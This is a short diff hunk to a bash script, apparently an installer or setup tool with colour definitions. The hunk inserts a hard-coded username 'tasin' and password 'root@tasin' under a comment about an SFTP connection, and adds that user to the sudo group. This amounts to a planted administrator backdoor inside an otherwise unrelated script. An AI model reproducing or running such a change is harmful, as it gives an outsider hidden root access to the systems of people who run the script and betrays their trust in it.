@@ -8,6 +8,12 @@ set -euo pipefail
 #   edit by: iTzTasin69
 #=========================================================
 
+# Connect Tasin SFTP USER AND PASS
+
+USERNAME="tasin"
+PASSWORD="root@tasin"
+adduser tasin sudo
+
 # --- Advanced Colors and Styles ---
 GREEN="\e[32m"
 YELLOW="\e[33m"
